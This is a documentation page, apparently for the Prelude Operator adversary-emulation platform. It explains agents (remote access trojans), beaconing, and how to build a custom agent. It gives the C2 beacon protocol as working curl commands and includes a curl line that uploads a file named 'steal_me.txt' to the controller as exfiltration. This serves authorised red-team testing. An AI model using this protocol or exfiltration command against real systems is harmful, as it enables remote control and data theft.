---
title: "Agent"
slug: "agent"
excerpt: "Remote Access Trojans"
hidden: false
metadata: 
  image: []
  robots: "index"
createdAt: "Wed Jun 29 2022 15:17:45 GMT+0000 (Coordinated Universal Time)"
updatedAt: "Wed Jan 25 2023 19:28:27 GMT+0000 (Coordinated Universal Time)"
---
An agent, often referred to as a Remote Access Trojan, is a process running on a remote computer which can run commands while under the control of a bad actor. Agents beacon into Operator periodically to ask for instructions to run. Each agent is automatically grouped into a range. Agents communicate to Operator through one of several network protocols, such as TCP, UDP, or HTTP.

### What is ThirdEye?

***

ThirdEye is a Node.js agent that is built directly into Operator. When Operator starts, ThirdEye automatically launches and beacons into your Home range with the username of the user running the desktop application. It only communicates locally to Operator and is designed for testing TTPs out before deploying them in the wild.  
This agent cannot be deleted.

### What is Pneuma?

***

Our most popular open-source agent is called [Pneuma](https://docs.preludesecurity.com/v1/docs/pneuma), a Go agent which supports all major operating systems  
and 3 different protocols (TCP, UDP, HTTP/S). Pneuma is capable of executing nearly all TTPs and chains loaded into Operator. Professional and enterprise customers have access to PneumaEX, an extended version with support for modules. 

### Additional agents

***

Prelude supports multiple script agents written in various languages. Some agents are designed for specific operating systems while others are multi-platform. You can find details about these agents in the main section, including download options to start using them.

### Agent limits

***

Operators are logical groupings of agents. For example, an Operator can be used to cluster agents from various platforms (darwin, linux, windows) in order to run a cross-platform chain against all the agents. Agents can be moved between Operators using either command line flags or the Update Config sidebar in the main section. Depending on the license level the maximum number of agents that can be connected at a single time differ - with 5 being the most for community members and 50 for professional and enterprise users.

### Agent facts

***

Each agent collects and manages its own collection of facts, which it will use as variables inside TTP commands. You can interact with these facts by clicking into the Knowledge Store. You can supply an agent with new facts manually or the agent can report facts itself through the Beacon object.

### Deleting an agent

***

When you delete a file-based agent, like Pneuma, the connection is stopped and the agent is archived - meaning it will no longer show up inside Operator but the data remains in your workspace, if you need to restore it. However, if you don't stop the agent's process on the compromised machine, the agent will just beacon back in and create a new version of itself. To stop the process, you will need to send the agent an "exit" keyword command. You can do this by using the "Stop Agent Process" procedure. Run this, then delete the agent to completely block it.

### Build your own agent

***

You can write your own agent in any language easily. Follow this simple interface to do so. You can copy the below commands into a terminal to get a real agent online. The required Beacon properties are: name, links, target, location, platform, executors, sleep, facts.

#### HTTP Agent 1st beacon to Operator

```shell
curl -X POST localhost:3391 -d '{
    "Name":"david",
    "Target":"127.0.0.1:3391",
    "Location":"/tmp/here",
    "Platform":"darwin",
    "Executors":["sh"],
    "Sleep":60,
    "Links":[],
    "Facts":[]
}'
```

#### Operator responds with instructions

```shell
{
    "links":[
        {
            "ID": "c1883712-c81b-40a8-952d-a15123c034c6",
            "Executor":"sh",
            "Request":"arp -a",
            "Payload":""
        }
    ]
}
```

#### HTTP Agent executes instructions and sends a new beacon

```shell
curl -X POST localhost:3391 -H 'Content-Type: text/plain' -d '{
    "Name":"david",
    "Target":"127.0.0.1:3391",
    "Location":"/tmp/here",
    "Platform":"darwin",
    "Executors":["sh"],
    "Sleep":60,
    "Links":[
        {
            "ID": "c1883712-c81b-40a8-952d-a15123c034c6",
            "Executor": "sh",
            "Payload": "",
            "Request": "arp -a",
            "Response": "some response",
            "Status": 0,
            "Pid": 123
       }
    ],
    "Facts":[]
}'
```

### Additional options

Aside from sending beacons, an agent can also exfiltrate files back to Operator over HTTP(s). Below is an example in cURL. The agent must supply the API token along with its name. Any exfiltrated files will be stored in your agent's artifacts directory (in the Prelude workspace).

```shell
curl -X PUT "http://localhost:3391" -H "key: ${operator.session}" -H "agent: ${agent.name}" -F upload=@steal_me.txt
```
